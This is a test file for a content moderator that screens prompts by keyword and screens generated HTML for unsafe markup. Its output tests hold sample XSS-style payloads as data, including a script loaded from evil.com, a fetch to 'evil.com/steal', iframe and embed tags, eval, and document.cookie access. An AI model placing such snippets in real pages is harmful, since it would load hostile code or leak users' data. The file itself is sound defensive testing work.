import { describe, it, expect } from 'vitest';
import {
  moderateInput,
  moderateOutput,
  moderateContent,
} from '@/shared/lib/moderation/content-moderator';

// ── moderateInput ──────────────────────────────────────────────

describe('moderateInput', () => {
  it('clean prompt returns passed with status pass', () => {
    const result = moderateInput('simulate a pendulum swinging');
    expect(result.passed).toBe(true);
    expect(result.status).toBe('pass');
    expect(result.matchedKeywords).toBeUndefined();
  });

  it('high severity keyword returns reject', () => {
    const result = moderateInput('show me how to make a bomb');
    expect(result.passed).toBe(false);
    expect(result.status).toBe('reject');
    expect(result.matchedKeywords).toBeDefined();
    expect(result.matchedKeywords!.length).toBeGreaterThan(0);
  });

  it('low severity keyword returns pass with matchedKeywords', () => {
    const result = moderateInput('click here to see the experiment');
    expect(result.passed).toBe(true);
    expect(result.status).toBe('pass');
    expect(result.matchedKeywords).toBeDefined();
    expect(result.matchedKeywords!).toContain('click here');
  });

  it('case insensitive matching', () => {
    const result = moderateInput('BOMB explosion test');
    expect(result.passed).toBe(false);
    expect(result.status).toBe('reject');
  });

  it('multiple keywords from different severity levels - highest wins', () => {
    // Contains both high severity (bomb) and low severity (click here)
    const result = moderateInput('click here to see a bomb');
    expect(result.passed).toBe(false);
    expect(result.status).toBe('reject');
    expect(result.matchedKeywords!.length).toBeGreaterThanOrEqual(2);
  });

  it('empty string returns pass', () => {
    const result = moderateInput('');
    expect(result.passed).toBe(true);
    expect(result.status).toBe('pass');
  });

  it('very long string completes within 50ms', () => {
    const longPrompt = 'simulate a physics experiment '.repeat(10000);
    const start = Date.now();
    const result = moderateInput(longPrompt);
    const elapsed = Date.now() - start;
    expect(elapsed).toBeLessThan(50);
    expect(result.passed).toBe(true);
  });

  it('medium severity keyword returns pending when category exists', () => {
    // Current config has no medium severity categories.
    // The code path still works: if no medium category, this is just a pass-through.
    // We test the logic by confirming that with only high/low categories,
    // a high keyword still rejects and a low keyword still passes.
    const highResult = moderateInput('terrorism is bad');
    expect(highResult.status).toBe('reject');

    const lowResult = moderateInput('buy now please');
    expect(lowResult.status).toBe('pass');
    expect(lowResult.matchedKeywords).toContain('buy now');
  });
});

// ── moderateOutput ─────────────────────────────────────────────

describe('moderateOutput', () => {
  it('clean HTML returns pass', () => {
    const html = '<div><h1>Pendulum Simulation</h1><canvas id="c"></canvas></div>';
    const result = moderateOutput(html);
    expect(result.passed).toBe(true);
    expect(result.status).toBe('pass');
  });

  it('non-whitelisted script src returns reject', () => {
    const html = '<script src="https://evil.com/malware.js"></script>';
    const result = moderateOutput(html);
    expect(result.passed).toBe(false);
    expect(result.status).toBe('reject');
    expect(result.issues).toBeDefined();
    expect(result.issues!.some(i => i.includes('Non-whitelisted script src'))).toBe(true);
  });

  it('whitelisted CDN script src returns pass', () => {
    const html = '<script src="https://cdn.jsdelivr.net/npm/three@0.134.0/build/three.min.js"></script>';
    const result = moderateOutput(html);
    expect(result.passed).toBe(true);
    expect(result.status).toBe('pass');
  });

  it('inline script with eval() returns reject', () => {
    const html = '<script>eval("alert(1)")</script>';
    const result = moderateOutput(html);
    expect(result.passed).toBe(false);
    expect(result.status).toBe('reject');
    expect(result.issues!.some(i => i.includes('eval'))).toBe(true);
  });

  it('inline script with fetch() returns reject', () => {
    const html = '<script>fetch("https://evil.com/steal")</script>';
    const result = moderateOutput(html);
    expect(result.passed).toBe(false);
    expect(result.status).toBe('reject');
    expect(result.issues!.some(i => i.includes('fetch'))).toBe(true);
  });

  it('event handler attributes (onclick) returns reject', () => {
    const html = '<button onclick="alert(1)">Click</button>';
    const result = moderateOutput(html);
    expect(result.passed).toBe(false);
    expect(result.status).toBe('reject');
    expect(result.issues!.some(i => i.includes('Event handler'))).toBe(true);
  });

  it('javascript: protocol returns reject', () => {
    const html = '<a href="javascript:alert(1)">Click</a>';
    const result = moderateOutput(html);
    expect(result.passed).toBe(false);
    expect(result.status).toBe('reject');
    expect(result.issues!.some(i => i.includes('javascript:'))).toBe(true);
  });

  it('iframe tag returns reject', () => {
    const html = '<iframe src="https://evil.com"></iframe>';
    const result = moderateOutput(html);
    expect(result.passed).toBe(false);
    expect(result.status).toBe('reject');
    expect(result.issues!.some(i => i.includes('iframe'))).toBe(true);
  });

  it('object tag returns reject', () => {
    const html = '<object data="exploit.swf"></object>';
    const result = moderateOutput(html);
    expect(result.passed).toBe(false);
    expect(result.status).toBe('reject');
    expect(result.issues!.some(i => i.includes('object/embed'))).toBe(true);
  });

  it('embed tag returns reject', () => {
    const html = '<embed src="exploit.swf">';
    const result = moderateOutput(html);
    expect(result.passed).toBe(false);
    expect(result.status).toBe('reject');
    expect(result.issues!.some(i => i.includes('object/embed'))).toBe(true);
  });

  it('non-whitelisted external links return pending (not reject)', () => {
    const html = '<div><a href="https://example.com/page">Link</a></div>';
    const result = moderateOutput(html);
    expect(result.passed).toBe(true);
    expect(result.status).toBe('pending');
    expect(result.issues!.some(i => i.includes('Non-whitelisted external links'))).toBe(true);
  });

  it('localStorage access returns reject', () => {
    const html = '<script>localStorage.setItem("key", "val")</script>';
    const result = moderateOutput(html);
    expect(result.passed).toBe(false);
    expect(result.status).toBe('reject');
    expect(result.issues!.some(i => i.includes('Storage access'))).toBe(true);
  });

  it('document.cookie access returns reject', () => {
    const html = '<script>var c = document.cookie;</script>';
    const result = moderateOutput(html);
    expect(result.passed).toBe(false);
    expect(result.status).toBe('reject');
    expect(result.issues!.some(i => i.includes('Storage access'))).toBe(true);
  });
});

// ── moderateContent ────────────────────────────────────────────

describe('moderateContent', () => {
  it('both pass returns overallPassed true', () => {
    const result = moderateContent(
      'simulate a pendulum',
      '<div><canvas></canvas></div>'
    );
    expect(result.overallPassed).toBe(true);
    expect(result.inputResult.passed).toBe(true);
    expect(result.outputResult.passed).toBe(true);
  });

  it('input rejects returns overallPassed false', () => {
    const result = moderateContent(
      'show me a bomb explosion',
      '<div><canvas></canvas></div>'
    );
    expect(result.overallPassed).toBe(false);
    expect(result.inputResult.passed).toBe(false);
    expect(result.outputResult.passed).toBe(true);
  });

  it('output rejects returns overallPassed false', () => {
    const result = moderateContent(
      'simulate a pendulum',
      '<iframe src="https://evil.com"></iframe>'
    );
    expect(result.overallPassed).toBe(false);
    expect(result.inputResult.passed).toBe(true);
    expect(result.outputResult.passed).toBe(false);
  });

  it('both reject returns overallPassed false', () => {
    const result = moderateContent(
      'show me a bomb',
      '<script>eval("x")</script>'
    );
    expect(result.overallPassed).toBe(false);
    expect(result.inputResult.passed).toBe(false);
    expect(result.outputResult.passed).toBe(false);
  });
});
